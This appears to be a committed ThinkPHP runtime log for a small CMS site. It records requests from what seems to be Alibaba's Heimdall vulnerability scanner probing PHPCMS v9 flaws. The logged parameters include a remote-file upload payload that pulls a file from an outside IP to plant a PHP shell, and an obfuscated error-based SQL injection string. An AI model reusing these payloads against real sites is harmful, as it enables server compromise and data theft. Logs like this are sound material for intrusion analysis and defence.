@@ -1,0 +1,331 @@
+[ 2017-06-22T12:31:24+08:00 ] 121.42.29.115 140.205.225.193 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] blog.sppcms.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.054663s][吞吐率：18.29req/s] [内存消耗：2,733.70kb] [文件加载：57]
+[ info ] [ LANG ] /home/wwwroot/blog.sppcms.com/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'index'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'blog.sppcms.com:80',
+  'content-length' => '171',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'uIZwWLvT',
+  'password' => 'uIZwWLvT',
+  'email' => 'uIZwWLvT@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/blog.sppcms.com/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/wwwroot/blog.sppcms.com/application/index/view/index/index.html [ array (
+  0 => 'islogin',
+  1 => 'navlist',
+  2 => 'adlist',
+  3 => 'toplist',
+  4 => 'reclist',
+  5 => 'categorylist',
+  6 => 'catelist',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000503s ] mysql:dbname=sq_blog;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_nav` [ RunTime:0.000896s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 0 ORDER BY `sort` [ RunTime:0.000300s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 1 ORDER BY `sort` [ RunTime:0.000208s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 2 ORDER BY `sort` [ RunTime:0.000221s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 3 ORDER BY `sort` [ RunTime:0.000259s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 5 ORDER BY `sort` [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 6 ORDER BY `sort` [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 4 ORDER BY `sort` [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_ad` [ RunTime:0.000618s ]
+[ sql ] [ SQL ] SELECT * FROM `think_ad` WHERE  `status` = 1 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_product` [ RunTime:0.000798s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_top` = 1 LIMIT 2 [ RunTime:0.000290s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_rec` = 1 LIMIT 3 [ RunTime:0.000225s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_category` [ RunTime:0.000657s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 [ RunTime:0.000224s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 LIMIT 5 [ RunTime:0.000205s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 348 [ RunTime:0.000213s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 353 [ RunTime:0.000229s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 354 [ RunTime:0.000229s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 355 [ RunTime:0.000197s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (353,354,355,348) LIMIT 8 [ RunTime:0.000288s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 356 [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (356) LIMIT 8 [ RunTime:0.000280s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_config` [ RunTime:0.000774s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000217s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'siteinfo' LIMIT 1 [ RunTime:0.000215s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'address' LIMIT 1 [ RunTime:0.000189s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000192s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'tel' LIMIT 1 [ RunTime:0.000186s ]
+
+---------------------------------------------------------------
+[ 2017-06-22T12:31:24+08:00 ] 121.42.29.115 140.205.225.193 GET /index.php?m=wap&a=index&siteid=1
+[ log ] blog.sppcms.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.053017s][吞吐率：18.86req/s] [内存消耗：2,731.63kb] [文件加载：57]
+[ info ] [ LANG ] /home/wwwroot/blog.sppcms.com/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'index'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'connection' => 'close',
+  'host' => 'blog.sppcms.com:80',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/blog.sppcms.com/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/wwwroot/blog.sppcms.com/application/index/view/index/index.html [ array (
+  0 => 'islogin',
+  1 => 'navlist',
+  2 => 'adlist',
+  3 => 'toplist',
+  4 => 'reclist',
+  5 => 'categorylist',
+  6 => 'catelist',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000483s ] mysql:dbname=sq_blog;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_nav` [ RunTime:0.000894s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 0 ORDER BY `sort` [ RunTime:0.000297s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 1 ORDER BY `sort` [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 2 ORDER BY `sort` [ RunTime:0.000205s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 3 ORDER BY `sort` [ RunTime:0.000196s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 5 ORDER BY `sort` [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 6 ORDER BY `sort` [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 4 ORDER BY `sort` [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_ad` [ RunTime:0.000750s ]
+[ sql ] [ SQL ] SELECT * FROM `think_ad` WHERE  `status` = 1 [ RunTime:0.000186s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_product` [ RunTime:0.000790s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_top` = 1 LIMIT 2 [ RunTime:0.000317s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_rec` = 1 LIMIT 3 [ RunTime:0.000218s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_category` [ RunTime:0.000656s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 LIMIT 5 [ RunTime:0.000227s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 348 [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 353 [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 354 [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 355 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (353,354,355,348) LIMIT 8 [ RunTime:0.000313s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 356 [ RunTime:0.000198s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (356) LIMIT 8 [ RunTime:0.000256s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_config` [ RunTime:0.000661s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000205s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'siteinfo' LIMIT 1 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'address' LIMIT 1 [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000187s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'tel' LIMIT 1 [ RunTime:0.000215s ]
+
+---------------------------------------------------------------
+[ 2017-06-22T12:31:24+08:00 ] 121.42.29.115 140.205.225.193 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ log ] blog.sppcms.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.055704s][吞吐率：17.95req/s] [内存消耗：2,732.80kb] [文件加载：57]
+[ info ] [ LANG ] /home/wwwroot/blog.sppcms.com/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'index'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'blog.sppcms.com:80',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/blog.sppcms.com/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/wwwroot/blog.sppcms.com/application/index/view/index/index.html [ array (
+  0 => 'islogin',
+  1 => 'navlist',
+  2 => 'adlist',
+  3 => 'toplist',
+  4 => 'reclist',
+  5 => 'categorylist',
+  6 => 'catelist',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000486s ] mysql:dbname=sq_blog;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_nav` [ RunTime:0.000880s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 0 ORDER BY `sort` [ RunTime:0.000289s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 1 ORDER BY `sort` [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 2 ORDER BY `sort` [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 3 ORDER BY `sort` [ RunTime:0.000225s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 5 ORDER BY `sort` [ RunTime:0.000192s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 6 ORDER BY `sort` [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 4 ORDER BY `sort` [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_ad` [ RunTime:0.000626s ]
+[ sql ] [ SQL ] SELECT * FROM `think_ad` WHERE  `status` = 1 [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_product` [ RunTime:0.000814s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_top` = 1 LIMIT 2 [ RunTime:0.000319s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_rec` = 1 LIMIT 3 [ RunTime:0.000220s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_category` [ RunTime:0.000651s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 LIMIT 5 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 348 [ RunTime:0.000263s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 353 [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 354 [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 355 [ RunTime:0.000232s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (353,354,355,348) LIMIT 8 [ RunTime:0.000326s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 356 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (356) LIMIT 8 [ RunTime:0.000255s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_config` [ RunTime:0.000765s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000196s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'siteinfo' LIMIT 1 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'address' LIMIT 1 [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000189s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000277s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'tel' LIMIT 1 [ RunTime:0.000188s ]
+
+---------------------------------------------------------------
+[ 2017-06-22T12:31:24+08:00 ] 121.42.29.115 140.205.225.193 GET /index.php?m=content&c=down&a_k=
+[ log ] blog.sppcms.com:80/index.php?m=content&c=down&a_k= [运行时间：0.059673s][吞吐率：16.76req/s] [内存消耗：2,731.76kb] [文件加载：57]
+[ info ] [ LANG ] /home/wwwroot/blog.sppcms.com/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'index'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'blog.sppcms.com:80',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/blog.sppcms.com/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/wwwroot/blog.sppcms.com/application/index/view/index/index.html [ array (
+  0 => 'islogin',
+  1 => 'navlist',
+  2 => 'adlist',
+  3 => 'toplist',
+  4 => 'reclist',
+  5 => 'categorylist',
+  6 => 'catelist',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000514s ] mysql:dbname=sq_blog;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_nav` [ RunTime:0.000897s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 0 ORDER BY `sort` [ RunTime:0.000284s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 1 ORDER BY `sort` [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 2 ORDER BY `sort` [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 3 ORDER BY `sort` [ RunTime:0.000197s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 5 ORDER BY `sort` [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 6 ORDER BY `sort` [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT * FROM `think_nav` WHERE  `pid` = 4 ORDER BY `sort` [ RunTime:0.000192s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_ad` [ RunTime:0.000715s ]
+[ sql ] [ SQL ] SELECT * FROM `think_ad` WHERE  `status` = 1 [ RunTime:0.000208s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_product` [ RunTime:0.000854s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_top` = 1 LIMIT 2 [ RunTime:0.000340s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `is_rec` = 1 LIMIT 3 [ RunTime:0.000447s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_category` [ RunTime:0.000813s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `status` = 1  AND `pid` = 0 LIMIT 5 [ RunTime:0.000212s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 348 [ RunTime:0.000236s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 353 [ RunTime:0.000206s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 354 [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 355 [ RunTime:0.000286s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (353,354,355,348) LIMIT 8 [ RunTime:0.000314s ]
+[ sql ] [ SQL ] SELECT * FROM `think_category` WHERE  `pid` = 356 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `think_product` WHERE  `status` = 1  AND `category_id` IN (356) LIMIT 8 [ RunTime:0.000261s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `think_config` [ RunTime:0.000843s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'logo' LIMIT 1 [ RunTime:0.000218s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'siteinfo' LIMIT 1 [ RunTime:0.000241s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'address' LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'email' LIMIT 1 [ RunTime:0.000197s ]
+[ sql ] [ SQL ] SELECT * FROM `think_config` WHERE  `name` = 'tel' LIMIT 1 [ RunTime:0.000191s ]
+
+---------------------------------------------------------------
